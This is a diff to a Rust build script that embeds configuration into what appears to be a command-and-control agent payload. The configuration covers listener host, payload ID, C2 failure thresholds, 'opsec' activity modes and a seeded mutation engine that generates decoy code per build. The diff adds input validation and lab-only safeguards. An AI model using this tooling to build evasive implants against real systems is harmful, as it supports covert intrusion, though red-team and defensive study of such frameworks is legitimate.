@@ -1,6 +1,9 @@
+use serde_json::json;
 use std::env;
 use std::fs;
 use std::path::{Path, PathBuf};
+use std::str::FromStr;
+use url::Url;
 
 fn log_build(msg: &str) {
     println!("[BUILD] {}", msg);
@@ -8,10 +11,14 @@ fn log_build(msg: &str) {
 
 // --- Seeded source mutation engine (issue #67, R1 milestone 0) ---
 // All mutation decisions in a build derive from MUTATION_SEED (hex u64) via
-// this PRNG, so any payload is reproducible from (source revision, seed).
+// this PRNG. The complete payload is reproducible only when every build input,
+// including the per-build enrollment credential, is held constant. Production
+// generates that credential randomly and deliberately does not persist it raw.
 
 // Fixed fallback used for manual builds that do not set MUTATION_SEED.
 const DEV_MUTATION_SEED: u64 = 0x4d69_6372_6f43_3200;
+const BOOTSTRAP_CREDENTIAL_ENCODED_BYTES: usize = 43;
+const CANONICAL_BOOTSTRAP_TRAILING_CHARS: &[u8] = b"AEIMQUYcgkosw048";
 
 // Hand-rolled splitmix64 PRNG; no external dependencies in the build script.
 struct SplitMix64 {
@@ -70,6 +77,99 @@ fn resolve_mutation_seed() -> (u64, bool) {
         }
         Err(_) => (DEV_MUTATION_SEED, false),
     }
+}
+
+fn is_canonical_bootstrap_credential(raw: &str) -> bool {
+    raw.len() == BOOTSTRAP_CREDENTIAL_ENCODED_BYTES
+        && raw
+            .bytes()
+            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'_'))
+        && raw
+            .as_bytes()
+            .last()
+            .is_some_and(|byte| CANONICAL_BOOTSTRAP_TRAILING_CHARS.contains(byte))
+}
+
+fn parse_environment<T>(name: &str, default: &str) -> T
+where
+    T: FromStr,
+    T::Err: std::fmt::Display,
+{
+    let raw = env::var(name).unwrap_or_else(|_| default.to_string());
+    raw.parse::<T>()
+        .unwrap_or_else(|err| panic!("{name} has invalid value {raw:?}: {err}"))
+}
+
+fn parse_boolean_environment(name: &str, default: bool) -> bool {
+    match env::var(name) {
+        Ok(raw) if raw == "true" => true,
+        Ok(raw) if raw == "false" => false,
+        Ok(raw) => panic!("{name} must be true or false, got {raw:?}"),
+        Err(_) => default,
+    }
+}
+
+fn validate_identifier(name: &str, value: &str) {
+    if value.is_empty()
+        || value.len() > 128
+        || !value
+            .bytes()
+            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'_' | b'.' | b':'))
+    {
+        panic!("{name} is outside the supported identifier contract");
+    }
+}
+
+fn canonical_listener_authority(host: &str, port: &str) -> String {
+    let parsed_port = port
+        .parse::<u16>()
+        .ok()
+        .filter(|port| *port != 0)
+        .unwrap_or_else(|| panic!("LISTENER_PORT must be an integer from 1 through 65535"));
+    let authority_host = if host.starts_with('[') && host.ends_with(']') {
+        host.to_string()
+    } else if host.contains(':') {
+        format!("[{host}]")
+    } else {
+        host.to_string()
+    };
+    let authority = format!("{authority_host}:{parsed_port}");
+    let probe = Url::parse(&format!("http://{authority}"))
+        .unwrap_or_else(|err| panic!("LISTENER_HOST is invalid: {err}"));
+    if probe.host_str().is_none()
+        || !probe.username().is_empty()
+        || probe.password().is_some()
+        || probe.query().is_some()
+        || probe.fragment().is_some()
+        || !matches!(probe.path(), "" | "/")
+    {
+        panic!("LISTENER_HOST must contain only a hostname or IP address");
+    }
+    authority
+}
+
+fn canonical_server_url(raw: &str, protocol: &str, host: &str, port: &str) -> String {
+    if !matches!(protocol, "http" | "https") {
+        panic!("PROTOCOL must be http or https");
+    }
+    let expected = format!("{protocol}://{}", canonical_listener_authority(host, port));
+    if raw != expected {
+        panic!("SERVER_URL must exactly match PROTOCOL, LISTENER_HOST, and LISTENER_PORT");
+    }
+    let parsed = Url::parse(raw).unwrap_or_else(|err| panic!("SERVER_URL is invalid: {err}"));
+    if parsed.scheme() != protocol
+        || parsed.host_str().is_none()
+        || !parsed.username().is_empty()
+        || parsed.password().is_some()
+        || parsed.query().is_some()
+        || parsed.fragment().is_some()
+        || !matches!(parsed.path(), "" | "/")
+    {
+        panic!(
+            "SERVER_URL must contain only the configured http(s) scheme, host, and explicit port"
+        );
+    }
+    expected
 }
 
 // Generate OUT_DIR/mutation.rs: seed-derived decoy functions, random string
@@ -148,6 +248,7 @@ fn main() {
     println!("cargo:rerun-if-changed=config.json");
     println!("cargo:rerun-if-env-changed=LISTENER_HOST");
     println!("cargo:rerun-if-env-changed=LISTENER_PORT");
+    println!("cargo:rerun-if-env-changed=SERVER_URL");
     println!("cargo:rerun-if-env-changed=LISTENER_ID");
     println!("cargo:rerun-if-env-changed=SLEEP_INTERVAL");
     println!("cargo:rerun-if-env-changed=PAYLOAD_ID");
@@ -156,6 +257,8 @@ fn main() {
     println!("cargo:rerun-if-env-changed=SOCKS5_HOST");
     println!("cargo:rerun-if-env-changed=SOCKS5_PORT");
     println!("cargo:rerun-if-env-changed=ALLOW_INVALID_CERTS");
+    println!("cargo:rerun-if-env-changed=ENROLLMENT_CREDENTIAL");
+    println!("cargo:rerun-if-env-changed=ALLOW_INSECURE_ISOLATED_LAB");
     println!("cargo:rerun-if-env-changed=BASE_MAX_C2_FAILS");
     println!("cargo:rerun-if-env-changed=C2_THRESH_INC_FACTOR");
     println!("cargo:rerun-if-env-changed=C2_THRESH_DEC_FACTOR");
@@ -164,6 +267,9 @@ fn main() {
     println!("cargo:rerun-if-env-changed=PROC_SCAN_INTERVAL_SECS");
     println!("cargo:rerun-if-env-changed=BASE_SCORE_THRESHOLD_BG_TO_REDUCED");
     println!("cargo:rerun-if-env-changed=BASE_SCORE_THRESHOLD_REDUCED_TO_FULL");
+    println!("cargo:rerun-if-env-changed=MIN_FULL_OPSEC_SECS");
+    println!("cargo:rerun-if-env-changed=MIN_REDUCED_OPSEC_SECS");
+    println!("cargo:rerun-if-env-changed=MIN_BG_OPSEC_SECS");
     println!("cargo:rerun-if-env-changed=REDUCED_ACTIVITY_SLEEP_SECS");
     println!("cargo:rerun-if-env-changed=MUTATION_SEED");
 
@@ -200,8 +306,9 @@ fn main() {
     // Get configuration from environment variables
     let server_host = env::var("LISTENER_HOST").unwrap_or_default();
     let server_port = env::var("LISTENER_PORT").unwrap_or_default();
+    let server_url = env::var("SERVER_URL").unwrap_or_default();
     let listener_id = env::var("LISTENER_ID").unwrap_or_default();
-    let sleep_interval = env::var("SLEEP_INTERVAL").unwrap_or_else(|_| "60".to_string());
+    let sleep_interval = parse_environment::<u64>("SLEEP_INTERVAL", "60");
     let payload_id = env::var("PAYLOAD_ID").unwrap_or_default();
     let protocol = env::var("PROTOCOL").unwrap_or_else(|_| {
         if server_port == "443" {
@@ -210,109 +317,127 @@ fn main() {
             "http".to_string()
         }
     });
-    let socks5_enabled = env::var("SOCKS5_ENABLED")
-        .unwrap_or_else(|_| "false".to_string())
-        .parse::<bool>()
-        .unwrap_or(false);
+    let socks5_enabled = parse_boolean_environment("SOCKS5_ENABLED", false);
     let socks5_host = env::var("SOCKS5_HOST").unwrap_or_else(|_| "127.0.0.1".to_string());
-    let socks5_port = env::var("SOCKS5_PORT").unwrap_or_else(|_| "9050".to_string());
-    let allow_invalid_certs = env::var("ALLOW_INVALID_CERTS")
-        .unwrap_or_else(|_| "false".to_string())
-        .parse::<bool>()
-        .unwrap_or(false);
+    let socks5_port = parse_environment::<u16>("SOCKS5_PORT", "9050");
+    let allow_invalid_certs = parse_boolean_environment("ALLOW_INVALID_CERTS", false);
+    let enrollment_credential = env::var("ENROLLMENT_CREDENTIAL").unwrap_or_default();
+    let allow_insecure_isolated_lab =
+        parse_boolean_environment("ALLOW_INSECURE_ISOLATED_LAB", false);
 
-    log_build(&format!("LISTENER_HOST: {}", server_host));
-    log_build(&format!("LISTENER_PORT: {}", server_port));
-    log_build(&format!("LISTENER_ID: {}", listener_id));
+    if allow_invalid_certs && !allow_insecure_isolated_lab {
+        panic!(
+            "ALLOW_INVALID_CERTS=true requires ALLOW_INSECURE_ISOLATED_LAB=true for an isolated lab build"
+        );
+    }
+
+    // Debug formatting escapes control characters in untrusted environment
+    // strings, preventing a rejected build input from forging build-log lines.
+    log_build(&format!("LISTENER_HOST: {:?}", server_host));
+    log_build(&format!("LISTENER_PORT: {:?}", server_port));
+    log_build(&format!("SERVER_URL: {:?}", server_url));
+    log_build(&format!("LISTENER_ID: {:?}", listener_id));
     log_build(&format!("SLEEP_INTERVAL: {}", sleep_interval));
-    log_build(&format!("PAYLOAD_ID: {}", payload_id));
-    log_build(&format!("PROTOCOL: {}", protocol));
+    log_build(&format!("PAYLOAD_ID: {:?}", payload_id));
+    log_build(&format!("PROTOCOL: {:?}", protocol));
     log_build(&format!("SOCKS5_ENABLED: {}", socks5_enabled));
-    log_build(&format!("SOCKS5_HOST: {}", socks5_host));
+    log_build(&format!("SOCKS5_HOST: {:?}", socks5_host));
     log_build(&format!("SOCKS5_PORT: {}", socks5_port));
     log_build(&format!("ALLOW_INVALID_CERTS: {}", allow_invalid_certs));
+    log_build(&format!(
+        "ENROLLMENT_CREDENTIAL: {}",
+        if enrollment_credential.is_empty() {
+            "<not set>"
+        } else {
+            "<redacted>"
+        }
+    ));
+    log_build(&format!(
+        "ALLOW_INSECURE_ISOLATED_LAB: {}",
+        allow_insecure_isolated_lab
+    ));
 
     // Only use environment config if we have all required values
-    let config_content = if !server_host.is_empty()
-        && !server_port.is_empty()
-        && !payload_id.is_empty()
-    {
+    let production_input_present = [
+        &server_host,
+        &server_port,
+        &server_url,
+        &listener_id,
+        &payload_id,
+        &enrollment_credential,
+    ]
+    .iter()
+    .any(|value| !value.is_empty());
+    let config_content = if production_input_present {
+        if server_host.is_empty()
+            || server_port.is_empty()
+            || server_url.is_empty()
+            || listener_id.is_empty()
+            || payload_id.is_empty()
+        {
+            panic!(
+                "LISTENER_HOST, LISTENER_PORT, SERVER_URL, LISTENER_ID, and PAYLOAD_ID are required together"
+            );
+        }
+        validate_identifier("LISTENER_ID", &listener_id);
+        validate_identifier("PAYLOAD_ID", &payload_id);
+        if enrollment_credential.is_empty() {
+            panic!("ENROLLMENT_CREDENTIAL is required for an agent payload build");
+        }
+        if !is_canonical_bootstrap_credential(&enrollment_credential) {
+            panic!(
+                "ENROLLMENT_CREDENTIAL must be a canonical 32-byte unpadded base64url credential"
+            );
+        }
+        if protocol != "https" && !allow_insecure_isolated_lab {
+            panic!("non-HTTPS agent payload builds require ALLOW_INSECURE_ISOLATED_LAB=true");
+        }
+        let server_url = canonical_server_url(&server_url, &protocol, &server_host, &server_port);
         log_build("Using environment variables for config");
-        let base_score_bg_reduced_thresh =
-            env::var("BASE_SCORE_THRESHOLD_BG_TO_REDUCED").unwrap_or_else(|_| "20.0".to_string());
-        let base_score_reduced_full_thresh =
-            env::var("BASE_SCORE_THRESHOLD_REDUCED_TO_FULL").unwrap_or_else(|_| "60.0".to_string());
-        let min_full_opsec = env::var("MIN_FULL_OPSEC_SECS").unwrap_or_else(|_| "300".to_string());
-        let min_bg_opsec = env::var("MIN_BG_OPSEC_SECS").unwrap_or_else(|_| "60".to_string());
-        let base_max_c2_fails = env::var("BASE_MAX_C2_FAILS").unwrap_or_else(|_| "5".to_string());
-        let min_reduced_opsec =
-            env::var("MIN_REDUCED_OPSEC_SECS").unwrap_or_else(|_| "120".to_string());
-        let reduced_activity_sleep =
-            env::var("REDUCED_ACTIVITY_SLEEP_SECS").unwrap_or_else(|_| "120".to_string());
-        let c2_inc_factor = env::var("C2_THRESH_INC_FACTOR").unwrap_or_else(|_| "1.1".to_string());
-        let c2_dec_factor = env::var("C2_THRESH_DEC_FACTOR").unwrap_or_else(|_| "0.9".to_string());
-        let c2_adj_interval =
-            env::var("C2_THRESH_ADJ_INTERVAL").unwrap_or_else(|_| "3600".to_string());
-        let c2_max_mult = env::var("C2_THRESH_MAX_MULT").unwrap_or_else(|_| "2.0".to_string());
-        let proc_scan_interval =
-            env::var("PROC_SCAN_INTERVAL_SECS").unwrap_or_else(|_| "300".to_string());
-
-        format!(
-            r#"{{
-                "server_url": "{}:{}",
-                "sleep_interval": {},
-                "jitter": 2,
-                "payload_id": "{}",
-                "agent_id": "",
-                "listener_id": "{}",
-                "protocol": "{}",
-                "user_agent": "{}",
-                "mutation_seed": "{:016x}",
-                "mutation_endpoint_segments": ["{}", "{}"],
-                "socks5_enabled": {},
-                "socks5_host": "{}",
-                "socks5_port": {},
-                "allow_invalid_certs": {},
-                "base_score_threshold_bg_to_reduced": {},
-                "base_score_threshold_reduced_to_full": {},
-                "min_duration_full_opsec_secs": {},
-                "min_duration_background_opsec_secs": {},
-                "base_max_consecutive_c2_failures": {},
-                "min_duration_reduced_activity_secs": {},
-                "reduced_activity_sleep_secs": {},
-                "c2_failure_threshold_increase_factor": {},
-                "c2_failure_threshold_decrease_factor": {},
-                "c2_threshold_adjust_interval_secs": {},
-                "c2_dynamic_threshold_max_multiplier": {},
-                "proc_scan_interval_secs": {}
-            }}"#,
-            server_host,
-            server_port,
-            sleep_interval,
-            payload_id,
-            listener_id,
-            protocol,
-            user_agent,
-            mutation_seed,
-            endpoint_segments[0],
-            endpoint_segments[1],
-            socks5_enabled,
-            socks5_host,
-            socks5_port,
-            allow_invalid_certs,
-            base_score_bg_reduced_thresh,
-            base_score_reduced_full_thresh,
-            min_full_opsec,
-            min_bg_opsec,
-            base_max_c2_fails,
-            min_reduced_opsec,
-            reduced_activity_sleep,
-            c2_inc_factor,
-            c2_dec_factor,
-            c2_adj_interval,
-            c2_max_mult,
-            proc_scan_interval
-        )
+        let config = json!({
+            "server_url": server_url,
+            "sleep_interval": sleep_interval,
+            "jitter": 2,
+            "payload_id": payload_id,
+            "agent_id": "",
+            "listener_id": listener_id,
+            "enrollment_credential": enrollment_credential,
+            "protocol": protocol,
+            "user_agent": user_agent,
+            "mutation_seed": format!("{mutation_seed:016x}"),
+            "mutation_endpoint_segments": endpoint_segments,
+            "socks5_enabled": socks5_enabled,
+            "socks5_host": socks5_host,
+            "socks5_port": socks5_port,
+            "allow_invalid_certs": allow_invalid_certs,
+            "allow_insecure_isolated_lab": allow_insecure_isolated_lab,
+            "base_score_threshold_bg_to_reduced":
+                parse_environment::<f32>("BASE_SCORE_THRESHOLD_BG_TO_REDUCED", "20.0"),
+            "base_score_threshold_reduced_to_full":
+                parse_environment::<f32>("BASE_SCORE_THRESHOLD_REDUCED_TO_FULL", "60.0"),
+            "min_duration_full_opsec_secs":
+                parse_environment::<u64>("MIN_FULL_OPSEC_SECS", "300"),
+            "min_duration_background_opsec_secs":
+                parse_environment::<u64>("MIN_BG_OPSEC_SECS", "60"),
+            "base_max_consecutive_c2_failures":
+                parse_environment::<u32>("BASE_MAX_C2_FAILS", "5"),
+            "min_duration_reduced_activity_secs":
+                parse_environment::<u64>("MIN_REDUCED_OPSEC_SECS", "120"),
+            "reduced_activity_sleep_secs":
+                parse_environment::<u64>("REDUCED_ACTIVITY_SLEEP_SECS", "120"),
+            "c2_failure_threshold_increase_factor":
+                parse_environment::<f32>("C2_THRESH_INC_FACTOR", "1.1"),
+            "c2_failure_threshold_decrease_factor":
+                parse_environment::<f32>("C2_THRESH_DEC_FACTOR", "0.9"),
+            "c2_threshold_adjust_interval_secs":
+                parse_environment::<u64>("C2_THRESH_ADJ_INTERVAL", "3600"),
+            "c2_dynamic_threshold_max_multiplier":
+                parse_environment::<f32>("C2_THRESH_MAX_MULT", "2.0"),
+            "proc_scan_interval_secs":
+                parse_environment::<u64>("PROC_SCAN_INTERVAL_SECS", "300"),
+        });
+        serde_json::to_string_pretty(&config)
+            .unwrap_or_else(|err| panic!("failed to serialize embedded config: {err}"))
     } else if let Ok(content) = fs::read_to_string("config.json") {
         log_build("Using config.json file for config");
         // We assume config.json contains the new fields if needed,
@@ -328,11 +453,13 @@ fn main() {
             "payload_id": "",
             "agent_id": "",
             "listener_id": "",
+            "enrollment_credential": "",
             "protocol": "http",
             "socks5_enabled": false,
             "socks5_host": "127.0.0.1",
             "socks5_port": 9050,
             "allow_invalid_certs": false,
+            "allow_insecure_isolated_lab": false,
             "base_score_threshold_bg_to_reduced": 20.0,
             "base_score_threshold_reduced_to_full": 60.0,
             "min_duration_full_opsec_secs": 300,
